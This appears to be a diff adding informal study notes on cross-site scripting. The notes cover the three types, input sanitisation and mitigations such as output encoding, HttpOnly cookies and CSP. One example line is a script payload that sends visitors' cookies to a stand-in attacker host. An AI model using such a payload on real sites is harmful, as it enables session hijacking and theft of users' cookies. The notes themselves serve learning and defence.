@@ -1,0 +1,75 @@
+XSS ATTACKS-
+___________________________
+
+
+
+Cross-Site Scripting (XSS) is a prevalent security vulnerability in web applications, where attackers inject malicious scripts into trusted websites.
+
+1.STORED XSS - STORED IN DB AND gets executed when browser pages loads
+2.Reflected xss- The malicious script is embedded in a URL or form submission. The server reflects the input back in its response, causing the script to execute in the user's browser.
+3.Dom based xss- The vulnerability exists in client-side scripts that dynamically update the page's content. Malicious input modifies the Document Object Model (DOM) environment in the browser, leading to script execution.
+
+
+
+WHERE MALICIOUS SCRIPT GETS INJECTED INTO THE PAGE AND GETS EXECUTED IN BROWSER
+
+
+STORED XSS - STORED IN DB AND gets executed when browser pages loads
+_________________
+
+
+
+Reflected xss
+
+
+Dom based xss
+
+___________________________
+
+Imagine a website with content section, if the site doesn’t sanitize the input and if web site inject the script, every visitor every user see s it
+
+________________________
+
+Sanitize the input
+
+
+We can use Dompurify
+
+
+________________
+
+
+Reflected css - click on link and inject the malicious script
+
+
+___________________________
+
+Document.getElementByiD.textContent is better for css attack
+
+
+.innerHtml is prone to css attack
+
+_____________
+
+
+🔍 Real-World Example
+Consider a comment section on a blog where users can post messages. If the application displays these comments without sanitizing the input, an attacker could post a comment like:
+html
+CopyEdit
+<script>document.location='http://malicious-site.com/steal?cookie='+document.cookie</script>
+
+When other users view this comment, the script executes, sending their cookies to the attacker's server. This could allow the attacker to hijack user sessions and impersonate them.
+
+
+
+Mitigation Strategies
+To protect against XSS attacks, developers should:
+* Validate and Sanitize Input: Ensure that all user inputs are checked for malicious content before processing.
+* Encode Output: Properly encode data before rendering it in the browser to prevent the execution of unintended scripts.Acunetix+3Veracode Docs+3StackHawk, Inc.+3
+* Use Security Libraries: Implement libraries and frameworks that automatically handle input validation and output encoding.
+* Set HTTPOnly and Secure Flags on Cookies: These flags prevent client-side scripts from accessing cookies and ensure they are transmitted over secure channels.Wikipedia
+* Implement Content Security Policy (CSP): Define approved sources of content to prevent the browser from loading malicious scripts.
+
+
+
+
